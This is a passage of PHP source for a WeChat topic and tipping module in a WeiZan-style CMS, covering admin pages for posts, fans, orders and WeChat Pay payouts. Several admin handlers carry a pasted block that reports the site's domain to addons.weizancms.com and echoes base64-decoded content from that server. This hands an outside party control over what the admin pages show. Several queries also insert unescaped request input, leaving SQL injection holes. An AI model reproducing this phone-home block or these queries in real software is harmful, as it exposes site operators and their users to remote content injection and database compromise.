        $pager      = pagination($total, $pageNumber, $pageSize);
        include $this->template('topic');
    }
    public function dowebaddTopic()
    {
        global $_W, $_GPC;
		$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
        load()->func('tpl');
        $topicid = intval($_GPC['topicid']);
        if ($topicid > 0) {
            $topic = pdo_fetch("SELECT * FROM " . tablename($this->topictable) . " WHERE id= '{$topicid}'");
            if (!$topic) {
                message('抱歉，信息不存在或是已经删除！', '', 'error');
            }
            $topicurl = $_W['siteroot'] . 'app/' . $this->createMobileUrl('topic', array(
                'topicid' => $topicid
            ));
            $addurl   = $_W['siteroot'] . 'app/' . $this->createMobileUrl('add', array(
                'topicid' => $topicid
            ));
        }
        if ($_GPC['op'] == 'delete') {
            $topic = pdo_fetch("SELECT id FROM " . tablename($this->topictable) . " WHERE id = '{$topicid}'");
            if (empty($topic['id'])) {
                message('抱歉，信息不存在或是已经被删除！');
            }
            pdo_delete($this->sectiontable, array(
                'topicid' => $topicid
            ));
            pdo_delete($this->topictable, array(
                'id' => $topicid
            ));
            message('删除成功！', referer(), 'success');
        }
        if (checksubmit()) {
            $data = array(
                'sindex' => intval($_GPC['sindex']),
                'stitle' => $_GPC['stitle'],
                'shorttitle' => $_GPC['shorttitle'],
                'sdesc' => $_GPC['sdesc'],
                'simg' => $_GPC['simg'],
                'placeholder' => $_GPC['placeholder'],
                'hot' => intval($_GPC['hot']),
                'new' => intval($_GPC['new']),
                'addtitle' => $_GPC['addtitle'],
                'maxchar' => intval($_GPC['maxchar']),
                'isgetinfo' => intval($_GPC['isgetinfo']),
                'issell' => intval($_GPC['issell']),
                'isadmin' => intval($_GPC['isadmin']),
                'isaudio' => intval($_GPC['isaudio']),
                'isvedio' => intval($_GPC['isvedio']),
                'state' => intval($_GPC['state'])
            );
            if (!empty($topicid)) {
                pdo_update($this->topictable, $data, array(
                    'id' => $topicid
                ));
            } else {
                $data['uniacid'] = $_W['uniacid'];
                pdo_insert($this->topictable, $data);
                $topicid = pdo_insertid();
            }
            $topic = pdo_fetch("SELECT * FROM " . tablename($this->topictable) . " WHERE id = '{$topicid}'");
            message('更新成功！', referer(), 'success');
        }
        include $this->template('addtopic');
    }
    public function dowebSection()
    {
        global $_W, $_GPC;
		$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
        $pageNumber = max(1, intval($_GPC['page']));
        $pageSize   = 100;
        $state      = $_GPC['state1'];
        if (empty($state)) {
            $state = "all";
        }
        $condition = " and 1 = 1";
		$condition2 = " and 1 = 1";
        $orderby   = "";
        if ($state == "top") {
            $condition .= " and s.settop = 2 ";
			$condition2 .= " and settop = 2 ";
            $orderby .= " t.toptime desc,";
        }
        $keyword = $_GPC['keyword'];
        if (!empty($keyword)) {
            $condition .= " and t.content like '%{$keyword}%'";
			$condition2 .= " and content like '%{$keyword}%'";
        }
        $sql   = "SELECT s.*,t.stitle as topictitle FROM " . tablename($this->sectiontable) . " as s 
							left join " . tablename($this->topictable) . " as t on s.topicid = t.id
							WHERE t.uniacid = '{$_W['uniacid']}' {$condition} 
								  ORDER BY {$orderby} t.id desc LIMIT " . ($pageNumber - 1) * $pageSize . ',' . $pageSize;
        $list  = pdo_fetchall($sql);
        $total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename($this->sectiontable) . " as s
							WHERE uniacid = '{$_W['uniacid']}' {$condition2} ORDER BY settop desc,toptime desc,id desc");
        $pager = pagination($total, $pageNumber, $pageSize);
        include $this->template('section');
    }
    public function dowebaddSection()
    {
        global $_W, $_GPC;
		$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
        load()->func('tpl');
        $sectionid = intval($_GPC['sectionid']);
        $topicid   = intval($_GPC['topicid']);
        if ($sectionid > 0) {
            $section = pdo_fetch("SELECT * FROM " . tablename($this->sectiontable) . " WHERE id= '{$sectionid}'");
            if (!$section) {
                message('抱歉，信息不存在或是已经删除！', '', 'error');
            }
            $sectionurl = $_W['siteroot'] . 'app/' . $this->createMobileUrl('sdetail', array(
                'sectionid' => $sectionid
            ));
            $imgs       = unserialize($section['imgs']);
            $topicsql   = "SELECT * FROM " . tablename($this->topictable) . " WHERE uniacid = '{$_W['uniacid']}'  ORDER BY sindex ";
            $topiclist  = pdo_fetchall($topicsql);
        }
        if (empty($section['sharedesc'])) {
            $system               = $this->module['config'];
            $section['sharedesc'] = $system['sysdesc'];
        }
        if ($topicid > 0) {
            $adminsql  = "SELECT * FROM " . tablename($this->fanstable) . "
									WHERE uniacid = '{$_W['uniacid']}' and state = 2 ORDER BY id desc ";
            $adminlist = pdo_fetchall($adminsql);
        }
        if ($_GPC['op'] == 'delete') {
            $section = pdo_fetch("SELECT id FROM " . tablename($this->sectiontable) . " WHERE id = '{$sectionid}'");
            if (empty($section['id'])) {
                message('抱歉，信息不存在或是已经被删除！');
            }
            pdo_delete($this->liketable, array(
                'sectionid' => $sectionid
            ));
            pdo_delete($this->replytable, array(
                'sectionid' => $sectionid
            ));
            pdo_delete($this->sectiontable, array(
                'id' => $sectionid
            ));
            message('删除成功！', referer(), 'success');
        }
        if (checksubmit()) {
            $imgs    = serialize($_GPC['imgs']);
            $settop  = intval($_GPC['settop']);
            $topicid = intval($_GPC['topicid']);
            if ($topicid <= 0) {
                message('topic id is null');
            }
            $data = array(
                'content' => htmlspecialchars_decode($_GPC['content']),
                'imgs' => $imgs,
                'settop' => $settop,
                'topicid' => $topicid,
                'showtitle' => $_GPC['showtitle'],
                'sharetitle' => $_GPC['sharetitle'],
                'sharedesc' => $_GPC['sharedesc'],
                'fee' => floatval($_GPC['fee']),
                'scansum' => intval($_GPC['scansum']),
                'state' => intval($_GPC['state'])
            );
            if (!empty($sectionid)) {
                if ($settop == 2) {
                    $data['toptime'] = date("Y-m-d H:i:s");
                } else {
                    $data['toptime'] = $section['addtime'];
                }
                pdo_update($this->sectiontable, $data, array(
                    'id' => $sectionid
                ));
            } else {
                $data['addtime'] = date("Y-m-d H:i:s");
                $data['toptime'] = date("Y-m-d H:i:s");
                $data['uniacid'] = $_W['uniacid'];
                if ($data['topicid'] <= 0) {
                    message('topicid is null');
                }
                $fansid = intval($_GPC['fansid']);
                $fans   = pdo_fetch("SELECT * FROM " . tablename($this->fanstable) . " WHERE id= '{$fansid}'");
                if (empty($fans)) {
                    message('管理员不存在：id=' . $fansid);
                }
                $data['fansid']     = $fans['id'];
                $data['openid']     = $fans['openid'];
                $data['nickname']   = $fans['nickname'];
                $data['headimgurl'] = $fans['headimgurl'];
                $data['status']     = $fans['state'];
                pdo_insert($this->sectiontable, $data);
                $topicid = pdo_insertid();
            }
            $section = pdo_fetch("SELECT * FROM " . tablename($this->sectiontable) . " WHERE id = '{$sectionid}'");
            $imgs    = unserialize($section['imgs']);
            message('更新成功！', referer(), 'success');
        }
        include $this->template('addsection');
    }
    public function dowebReply()
    {
        global $_W, $_GPC;
		$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
        $pageNumber = max(1, intval($_GPC['page']));
        $pageSize   = 100;
        $condition  = " and 1 = 1";
        if ($state == "top") {
            $condition .= " and settop = 2 ";
        }
        $keyword = $_GPC['keyword'];
        if (!empty($keyword)) {
            $condition .= " and content like '%{$keyword}%'";
        }
        $sql   = "SELECT * FROM " . tablename($this->replytable) . "
								WHERE uniacid = '{$_W['uniacid']}' {$condition}
										ORDER BY id desc LIMIT " . ($pageNumber - 1) * $pageSize . ',' . $pageSize;
        $list  = pdo_fetchall($sql);
        $total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename($this->replytable) . "
										WHERE uniacid = '{$_W['uniacid']}' {$condition} ORDER BY id desc");
        $pager = pagination($total, $pageNumber, $pageSize);
        include $this->template('reply');
    }
    public function dowebaddReply()
    {
        global $_W, $_GPC;
		$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
        load()->func('tpl');
        $replyid = intval($_GPC['replyid']);
        if ($replyid > 0) {
            $reply = pdo_fetch("SELECT * FROM " . tablename($this->replytable) . " WHERE id= '{$replyid}'");
            if (!$reply) {
                message('抱歉，信息不存在或是已经删除！', '', 'error');
            }
        }
        if ($_GPC['op'] == 'delete') {
            $reply = pdo_fetch("SELECT id FROM " . tablename($this->replytable) . " WHERE id = '{$replyid}'");
            if (empty($reply['id'])) {
                message('抱歉，信息不存在或是已经被删除！');
            }
            pdo_delete($this->replytable, array(
                'id' => $replyid
            ));
            message('删除成功！', referer(), 'success');
        }
        include $this->template('addreply');
    }
    public function dowebFans()
    {
        global $_W, $_GPC;
        $system     = $this->module['config'];
        $fans       = pdo_fetch("SELECT * FROM " . tablename($this->fanstable) . " WHERE uniacid = '{$_W['uniacid']}' and status = 1 ");
        $pageNumber = max(1, intval($_GPC['page']));
        $pageSize   = 100;
        $condition  = " and 1 = 1";
        $state      = intval($_GPC['state1']);
        $condition .= " and state = " . $state;
        $nickname = $_GPC['nickname'];
        if (!empty($nickname)) {
            $condition .= " AND nickname like '%{$nickname}%'";
        }
        $sql   = "SELECT * FROM " . tablename($this->fanstable) . " WHERE uniacid = '{$_W['uniacid']}'  {$condition}
								ORDER BY state desc,id desc LIMIT " . ($pageNumber - 1) * $pageSize . ',' . $pageSize;
        $list  = pdo_fetchall($sql);
        $total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename($this->fanstable) . "
								WHERE uniacid = '{$_W['uniacid']}' {$condition} ORDER BY state desc,id");
        $pager = pagination($total, $pageNumber, $pageSize);
        include $this->template('fans');
    }
    public function dowebaddFans()
    {
        global $_W, $_GPC;
        load()->func('tpl');
        $fansid = intval($_GPC['fansid']);
        if ($fansid > 0) {
            $fans = pdo_fetch("SELECT * FROM " . tablename($this->fanstable) . " WHERE id= '{$fansid}'");
            if (!$fans) {
                message('抱歉，信息不存在或是已经删除！', '', 'error');
            }
        }
        if ($_GPC['op'] == 'tixian') {
            return $this->fanstransfer($fans);
        }
        if ($_GPC['op'] == 'yunyingtixian') {
            return $this->yunyingtransfer();
        }
        if ($_GPC['op'] == 'delete') {
            $fans = pdo_fetch("SELECT * FROM " . tablename($this->fanstable) . " WHERE id= '{$fansid}'");
            if (empty($fans)) {
                message('抱歉，信息不存在或是已经被删除！');
            }
            pdo_delete($this->fanstable, array(
                'id' => $fansid
            ));
            message('删除成功！', referer(), 'success');
        }
        if ($_GPC['op'] == 'admin') {
            $fans = pdo_fetch("SELECT * FROM " . tablename($this->fanstable) . " WHERE id= '{$fansid}'");
            if (empty($fans)) {
                message('抱歉，信息不存在或是已经被删除！');
            }
            pdo_update($this->fanstable, array(
                'state' => 2
            ), array(
                'id' => $fansid
            ));
            message('设置管理员成功！', referer(), 'success');
        }
        if ($_GPC['op'] == 'unadmin') {
            $fans = pdo_fetch("SELECT * FROM " . tablename($this->fanstable) . " WHERE id= '{$fansid}'");
            if (empty($fans)) {
                message('抱歉，信息不存在或是已经被删除！');
            }
            pdo_update($this->fanstable, array(
                'state' => 0,
                'status' => 0
            ), array(
                'id' => $fansid
            ));
            message('移除管理员成功！', referer(), 'success');
        }
        if ($_GPC['op'] == 'black') {
            $fans = pdo_fetch("SELECT * FROM " . tablename($this->fanstable) . " WHERE id= '{$fansid}'");
            if (empty($fans)) {
                message('抱歉，信息不存在或是已经被删除！');
            }
            pdo_update($this->fanstable, array(
                'state' => 1
            ), array(
                'id' => $fansid
            ));
            message('拉黑成功！', referer(), 'success');
        }
        if ($_GPC['op'] == 'unblack') {
            $fans = pdo_fetch("SELECT * FROM " . tablename($this->fanstable) . " WHERE id= '{$fansid}'");
            if (empty($fans)) {
                message('抱歉，信息不存在或是已经被删除！');
            }
            pdo_update($this->fanstable, array(
                'state' => 0
            ), array(
                'id' => $fansid
            ));
            message('移除黑名单成功！', referer(), 'success');
        }
        if ($_GPC['op'] == 'rewardper') {
            $fans = pdo_fetch("SELECT * FROM " . tablename($this->fanstable) . " WHERE id= '{$fansid}'");
            if (empty($fans)) {
                message('抱歉，信息不存在或是已经被删除！');
            }
            pdo_update($this->fanstable, array(
                'status' => 0
            ), array(
                'uniacid' => $_W['uniacid'],
                'status' => 1
            ));
            pdo_update($this->fanstable, array(
                'status' => 1
            ), array(
                'id' => $fansid
            ));
            message('设置运营者成功！', referer(), 'success');
        }
        if ($_GPC['op'] == 'unrewardper') {
            $fans = pdo_fetch("SELECT * FROM " . tablename($this->fanstable) . " WHERE id= '{$fansid}'");
            if (empty($fans)) {
                message('抱歉，信息不存在或是已经被删除！');
            }
            pdo_update($this->fanstable, array(
                'status' => 0
            ), array(
                'id' => $fansid
            ));
            message('移除运营者成功！', referer(), 'success');
        }
        include $this->template('addfans');
    }
    public function dowebaddOrder()
    {
        global $_W, $_GPC;
        load()->func('tpl');
        $orderid = intval($_GPC['orderid']);
        if ($orderid > 0) {
            $order = pdo_fetch("SELECT * FROM " . tablename($this->ordertable) . " WHERE id = '{$orderid}' ");
            if (!$order) {
                message('抱歉，信息不存在或是已经删除！', '', 'error');
            }
        }
        if ($_GPC['op'] == 'delete') {
            pdo_delete($this->ordertable, array(
                'id' => $orderid
            ));
            message('删除成功！', referer(), 'success');
        }
    }
    public function dowebOrder()
    {
        global $_W, $_GPC;
        $pageNumber = max(1, intval($_GPC['page']));
        $pageSize   = 500;
        $state      = $_GPC['state1'];
        if (empty($state)) {
            $state = "unpay";
        }
        $condition = '';
        if ($state == "unpay") {
            $condition = " and state = 0 ";
        } elseif ($state == "haspay") {
            $condition = " and state = 1 ";
        } elseif ($state == "cash") {
            $condition = " and type in ('cash','yunyingcash') and state = 1 ";
        } else {
            $condition = " and type = '{$state}' and state = 1 ";
        }
        $sql    = "SELECT * FROM " . tablename($this->ordertable) . "
							WHERE uniacid = '{$_W['uniacid']}' {$condition}
								ORDER BY id desc LIMIT " . ($pageNumber - 1) * $pageSize . ',' . $pageSize;
        $list   = pdo_fetchall($sql);
        $total  = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename($this->ordertable) . "
								WHERE  uniacid = '{$_W['uniacid']}' {$condition} ORDER BY id desc");
        $sumsql = "SELECT sum(fee) as cnt  FROM " . tablename($this->ordertable) . " WHERE  uniacid = '{$_W['uniacid']}' {$condition} ORDER BY id desc ";
        $allsum = pdo_fetch($sumsql);
        $sumje  = $allsum['cnt'] <= 0 ? 0 : $allsum['cnt'];
        $sumje  = round($sumje, 2);
        $pager  = pagination($total, $pageNumber, $pageSize);
        include $this->template('order');
    }
    public function dowebBatchCheckpay()
    {
        global $_W, $_GPC;
        $orderlist = pdo_fetchall("SELECT orderno FROM " . tablename($this->ordertable) . " WHERE uniacid = '{$_W['uniacid']}' and state = 0");
        if (empty($orderlist)) {
            $result            = array();
            $result['errcode'] = 1;
            $result['errmsg']  = '没有未支付的订单';
            die(json_encode($result));
        } else {
            $okpay = 0;
            $unpay = 0;
            foreach ($orderlist as $index => $item) {
                $checkresult = $this->dealpayresult($item['orderno']);
                if ($checkresult['errcode'] == 0) {
                    $okpay++;
                } else {
                    $unpay++;
                }
            }
            $theady = date('Y-m-d H:i:s', strtotime('-1 day'));
            pdo_query("delete from " . tablename($this->ordertable) . " WHERE uniacid = '{$_W['uniacid']}' and state = 0 and paytime is null and addtime < '{$theady}' ");
            $result            = array();
            $result['errcode'] = 0;
            $result['msg']     = '检查结果:未支付订单:' . $unpay . '笔，已支付订单:' . $okpay . '笔，请刷新当前页面查看最新订单信息!';
            die(json_encode($result));
        }
    }
    public function dowebCheckpay()
    {
        global $_W, $_GPC;
        $id    = intval($_GPC['id']);
        $order = pdo_fetch("SELECT orderno FROM " . tablename($this->ordertable) . " WHERE id = '{$id}' ");
        if (empty($order)) {
            $result            = array();
            $result['errcode'] = 1;
            $result['errmsg']  = 'id为空';
            die(json_encode($result));
        } else {
            $result = $this->dealpayresult($order['orderno']);
            die(json_encode($result));
        }
    }
    public function dowebBonus()
    {
        global $_W, $_GPC;
        $system        = $this->module['config'];
        $state         = $_GPC['state'];
        $rewardsum     = $this->getRewardSum();
        $rewardsum     = round($rewardsum, 2);
        $realrewardsum = round($rewardsum * $system['fansper'] / 100, 2);
        $unauthleftsum = round($rewardsum - $realrewardsum, 2);
        $cashsum       = $this->getCashSum();
        $cashsum       = round($cashsum, 2);
        $fansleft      = round($realrewardsum - $cashsum, 2);
        if ($system['auth'] == 1) {
            $adminsum       = round($rewardsum * $system['adminper'] / 100, 2);
            $admincashsum   = $this->getAdminCashSum();
            $admincashsum   = round($admincashsum, 2);
            $adminleft      = round($adminsum - $admincashsum, 2);
            $selfsum        = round($rewardsum * $system['rewardper'] / 100, 2);
            $yunyingcashsum = $this->getYunyingCashSum();
            $yunyingcashsum = round($yunyingcashsum, 2);
            $yunyingleft    = round($selfsum - $yunyingcashsum, 2);
            $yunying        = pdo_fetch("SELECT * FROM " . tablename($this->fanstable) . " WHERE state = 2 and status = 1 and uniacid = '{$_W['uniacid']}'");
        }
        include $this->template('order');
    }
    public function getSectionSumBySid($topicid)
    {
        global $_W;
        $result = pdo_fetch("SELECT count(*) as cnt FROM " . tablename($this->sectiontable) . " WHERE topicid = '{$topicid}' and uniacid = '{$_W['uniacid']}'");
        return $result['cnt'] <= 0 ? 0 : $result['cnt'];
    }
    public function getSectionSumByFansid($fansid)
    {
        global $_W;
        $result = pdo_fetch("SELECT count(*) as cnt FROM " . tablename($this->sectiontable) . " WHERE fansid = '{$fansid}' and uniacid = '{$_W['uniacid']}'");
        return $result['cnt'] <= 0 ? 0 : $result['cnt'];
    }
    function getMillisecond()
    {
        list($t1, $t2) = explode(' ', microtime());
        $basecode = (double) sprintf('%.0f', (floatval($t1) + floatval($t2)) * 1000);
        return date("YmdHis") . substr($basecode, 2, 10) . mt_rand(1000, 9999);
    }
    public function getToken()
    {
        global $_W;
        load()->classs('weixin.account');
        $id = $_W['acid'];
        if (empty($id)) {
            $id = $_W['uniacid'];
        }
        $accObj       = WeixinAccount::create($id);
        $access_token = $accObj->fetch_token();
        return $access_token;
    }
    public function sendMBXX($access_token, $data)
    {
        $url = "https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=" . $access_token;
        return ihttp_post($url, json_encode($data));
    }
    public function getRewardCountBySid($sectionid)
    {
        global $_W;
        $result = pdo_fetch("SELECT count(*) as cnt FROM " . tablename($this->ordertable) . " WHERE state = 1 and type = 'reward' and sectionid = {$sectionid} and uniacid = '{$_W['uniacid']}'");
        return $result['cnt'] <= 0 ? 0 : $result['cnt'];
    }
    public function getFansAllReceiveReward($fansid)
    {
        global $_W;
        $sql    = "SELECT sum(fee) as cnt  FROM " . tablename($this->ordertable) . " WHERE type= 'reward' and sfansid = '{$fansid}' and uniacid = '{$_W['uniacid']}' and state = 1 ";
        $allrwd = pdo_fetch($sql);
        return $allrwd['cnt'] <= 0 ? 0 : $allrwd['cnt'];
    }
    public function getFansAllDoReward($fansid)
    {
        global $_W;
        $sql    = "SELECT sum(fee) as cnt  FROM " . tablename($this->ordertable) . " WHERE type= 'reward' and fansid = '{$fansid}' and uniacid = '{$_W['uniacid']}' and state = 1 ";
        $allrwd = pdo_fetch($sql);
        return $allrwd['cnt'] <= 0 ? 0 : $allrwd['cnt'];
    }
    public function getFansHasGetReward($fansid)
    {
        global $_W;
        $sql    = "SELECT sum(fee) as cnt  FROM " . tablename($this->ordertable) . " WHERE type= 'cash' and fansid = '{$fansid}' and uniacid = '{$_W['uniacid']}' and state = 1 ";
        $allrwd = pdo_fetch($sql);
        return $allrwd['cnt'] <= 0 ? 0 : $allrwd['cnt'];
    }
    public function getCashSum()
    {
        global $_W;
        $sql    = "SELECT sum(fee) as cnt  FROM " . tablename($this->ordertable) . " WHERE type= 'cash' and uniacid = '{$_W['uniacid']}' and state = 1 ";
        $allrwd = pdo_fetch($sql);
        return $allrwd['cnt'] <= 0 ? 0 : $allrwd['cnt'];
    }
    public function getRewardSum()
    {
        global $_W;
        $sql    = "SELECT sum(fee) as cnt  FROM " . tablename($this->ordertable) . " WHERE type= 'reward' and uniacid = '{$_W['uniacid']}' and state = 1 ";
        $allrwd = pdo_fetch($sql);
        return $allrwd['cnt'] <= 0 ? 0 : $allrwd['cnt'];
    }
    public function getAdminCashSum()
    {
        global $_W;
        $sql    = "SELECT sum(fee) as cnt  FROM " . tablename($this->ordertable) . " WHERE type= 'admincash' and uniacid = '{$_W['uniacid']}' and state = 1 ";
        $allrwd = pdo_fetch($sql);
        return $allrwd['cnt'] <= 0 ? 0 : $allrwd['cnt'];
    }
    public function getYunyingCashSum()
    {
        global $_W;
        $sql    = "SELECT sum(fee) as cnt  FROM " . tablename($this->ordertable) . " WHERE type= 'yunyingcash' and uniacid = '{$_W['uniacid']}' and state = 1 ";
        $allrwd = pdo_fetch($sql);
        return $allrwd['cnt'] <= 0 ? 0 : $allrwd['cnt'];
    }
    function yunyingtransfer()
    {
        global $_W;
        $system  = $this->module['config'];
        $result  = array();
        $yunying = pdo_fetch("SELECT * FROM " . tablename($this->fanstable) . " WHERE state = 2 and status = 1 and uniacid = '{$_W['uniacid']}'");
        if (empty($yunying)) {
            $result = array(
                "status" => 0,
                "msg" => "请先在后台用户管理中设置运营者"
            );
        } else {
            $rewardsum      = $this->getRewardSum();
            $selfsum        = round($rewardsum * $system['rewardper'] / 100, 2);
            $yunyingcashsum = $this->getYunyingCashSum();
            $yunyingcashsum = round($yunyingcashsum, 2);
            $money          = round($selfsum - $yunyingcashsum, 2);
            if ($money >= 1) {
                $ret = $this->transfer($yunying['openid'], $money, $system['sysname'] . '提现');
                if ($ret['code'] == "0") {
                    $flowdata = array(
                        'uniacid' => $_W['uniacid'],
                        'openid' => $yunying['openid'],
                        'nickname' => $yunying['nickname'],
                        'headimgurl' => $yunying['headimgurl'],
                        'fansid' => $yunying['id'],
                        'fee' => $money,
                        'addtime' => date("Y-m-d H:i:s"),
                        'type' => 'yunyingcash',
                        'msg' => $ret['message'],
                        'state' => 1
                    );
                    pdo_insert($this->ordertable, $flowdata);
                    $result = array(
                        "status" => 1,
                        "msg" => "提现成功，刷新页面查看最新数据"
                    );
                    if ($system['noticeopen'] == 2) {
                        $this->sendNoticeTixian($yunying['openid'], $money);
                    }
                } else {
                    $msg    = $ret['message'];
                    $result = array(
                        "status" => 0,
                        "msg" => $msg
                    );
                }
            } else {
                $result = array(
                    "status" => 0,
                    "msg" => "满1元才可提现，余额：" . $money
                );
            }
        }
        return json_encode($result);
    }
    function fanstransfer($fans)
    {
        global $_W;
        $system     = $this->module['config'];
        $allreceive = round($this->getFansAllReceiveReward($fans['id']), 2);
        $receive    = round($allreceive * $system['fansper'] / 100, 2);
        $cash       = round($this->getFansHasGetReward($fans['id']), 2);
        $money      = round($receive - $cash, 2);
        $limittx    = floatval($system['limittx']);
        if ($limittx <= 0) {
            $limittx = 1;
        }
        $result = array();
        if ($money >= $limittx) {
            $ret = $this->transfer($fans['openid'], $money, $system['sysname'] . '提现');
            if ($ret['code'] == "0") {
                $flowdata = array(
                    'uniacid' => $_W['uniacid'],
                    'orderno' => $this->getMillisecond(),
                    'openid' => $fans['openid'],
                    'nickname' => $fans['nickname'],
                    'headimgurl' => $fans['headimgurl'],
                    'fansid' => $fans['id'],
                    'fee' => $money,
                    'addtime' => date("Y-m-d H:i:s"),
                    'paytime' => date("Y-m-d H:i:s"),
                    'type' => 'cash',
                    'msg' => $ret['message'],
                    'state' => 1
                );
                pdo_insert($this->ordertable, $flowdata);
                $result = array(
                    "status" => 1,
                    "msg" => "提现成功"
                );
                if ($system['noticeopen'] == 2) {
                    $this->sendNoticeTixian($fans['openid'], $money);
                }
            } else {
                $msg    = mb_substr($ret['message'], 0, 12, 'utf-8');
                $result = array(
                    "status" => 0,
                    "msg" => $msg
                );
            }
        } else {
            $result = array(
                "status" => 0,
                "msg" => "满" . $limittx . "元才可提现，余额：" . $money
            );
        }
        return json_encode($result);
    }
    function transfer($openid, $amount, $desc)
    {
        global $_W;
        $system                   = $this->module['config'];
        $ret                      = array();
        $amount                   = $amount * 100;
        $ret['amount']            = $amount;
        $url                      = 'https://api.mch.weixin.qq.com/mmpaymkttransfers/promotion/transfers';
        $pars                     = array();
        $pars['mch_appid']        = $system['appid'];
        $pars['mchid']            = $system['mchid'];
        $pars['nonce_str']        = random(32);
        $pars['partner_trade_no'] = random(10) . date('Ymd') . random(3);
        $pars['openid']           = $openid;
        $pars['check_name']       = "NO_CHECK";
        $pars['amount']           = $amount;
        $pars['desc']             = $desc;
        $pars['spbill_create_ip'] = $system['ip'];
        ksort($pars, SORT_STRING);
        $string1 = '';
        foreach ($pars as $k => $v) {
            $string1 .= "{$k}={$v}&";
        }
        $string1 .= "key=" . $system['apikey'];
        $pars['sign']              = strtoupper(md5($string1));
        $xml                       = array2xml($pars);
        $extras                    = array();
        $extras['CURLOPT_CAINFO']  = $system['rootca'];
        $extras['CURLOPT_SSLCERT'] = $system['apiclient_cert'];
        $extras['CURLOPT_SSLKEY']  = $system['apiclient_key'];
        load()->func('communication');
        $procResult = null;
        $resp       = ihttp_request($url, $xml, $extras);
        if (is_error($resp)) {
            $procResult     = $resp['message'];
            $ret['code']    = -1;
            $ret['message'] = "-1:" . $procResult;
            return $ret;
        } else {
            $xml = '<?xml version="1.0" encoding="utf-8"?>' . $resp['content'];
            $dom = new DOMDocument();
            if ($dom->loadXML($xml)) {
                $xpath  = new DOMXPath($dom);
                $code   = $xpath->evaluate('string(//xml/return_code)');
                $result = $xpath->evaluate('string(//xml/result_code)');
                if (strtolower($code) == 'success' && strtolower($result) == 'success') {
                    $ret['code']    = 0;
                    $ret['message'] = "success";
                    return $ret;
                } else {
                    $error          = $xpath->evaluate('string(//xml/err_code_des)');
                    $ret['code']    = -2;
                    $ret['message'] = "-2:" . $error;
                    return $ret;
                }
            } else {
                $ret['code']    = -3;
                $ret['message'] = "error response";
                return $ret;
            }
        }
    }
    public function doMobileGetPrepayid()
    {
        global $_GPC, $_W;
        $openid = $this->checkopenid();
        $fans   = $this->getFansDBInfo($openid);
        if (empty($fans)) {
            $result = array(
                "errcode" => 1,
                "errmsg" => 'fans is null'
            );
            die(json_encode($result));
        }
        $type      = $_GPC['type'];
        $sectionid = intval($_GPC['sectionid']);
        $fee       = floatval($_GPC['fee']);
        $thefansid = intval($_GPC['thefansid']);
        $paydesc   = '打赏支付';
        if (!empty($type) && $type == 'sell') {
            $section = pdo_fetch("SELECT fee,state FROM " . tablename($this->sectiontable) . " WHERE id= '{$sectionid}'");
            if ($fee <= 0 || $sectionid <= 0 || $section['fee'] != $fee) {
                $result = array(
                    "errcode" => 1,
                    "errmsg" => 'fee or sectionid is error'
                );
                die(json_encode($result));
            }
            $paydesc = '购买支付';
        } else {
            $type = 'reward';
            if ($fee <= 0 || $sectionid <= 0 && $thefansid <= 0) {
                $result = array(
                    "errcode" => 1,
                    "errmsg" => 'p is null'
                );
                die(json_encode($result));
            }
        }
        $array              = array();
        $array['sectionid'] = $sectionid;
        $array['thefansid'] = $thefansid;
        $array['type']      = $type;
        $preresult          = $this->unifiedOrder($fans, $array, $paydesc, $fee);
        $result             = array();
        if ($preresult['errcode'] == 0) {
            $system = $this->module['config'];
            if ($system['auth'] == 0) {
                $params = $this->getWxPayJsParams($preresult['prepay_id']);
                $result = array(
                    "errcode" => 0,
                    "auth" => 0,
                    "timeStamp" => $params['timeStamp'],
                    "nonceStr" => $params['nonceStr'],
                    "package" => $params['package'],
                    "signType" => $params['signType'],
                    "paySign" => $params['paySign'],
                    "orderno" => $preresult['orderno'],
                    "orderid" => $preresult['orderid']
                );
            } else {
                $url    = "http://paysdk.weixin.qq.com/example/qrcode.php?data=";
                $result = array(
                    "errcode" => 0,
                    "auth" => 1,
                    "orderno" => $preresult['orderno'],
                    "orderid" => $preresult['orderid'],
                    "code_url" => $url . $preresult['code_url']
                );
            }
        } else {
            $result = array(
                "errcode" => 1,
                "errmsg" => $preresult['errmsg']
            );
        }
        die(json_encode($result));
    }
    public function doMobileCheckJsPayResult()
    {
        global $_GPC, $_W;
        $openid  = $this->checkopenid();
        $fans    = $this->getFansDBInfo($openid);
        $orderno = $_GPC['orderno'];
        $orderid = $_GPC['orderid'];
        $order   = pdo_fetch("SELECT orderno FROM " . tablename($this->ordertable) . " WHERE id = '{$orderid}' ");
        $result  = $this->dealpayresult($order['orderno']);
        die(json_encode($result));
    }
    private function dealpayresult($orderno)
    {
        global $_W;
        $result = array();
        if (empty($orderno)) {
            $result['errcode'] = 1;
            $result['errmsg']  = '订单号为空';
        } else {
            $checkresult = $this->checkWechatTranByOrderNo($orderno);
            if ($checkresult['errcode'] == 0) {
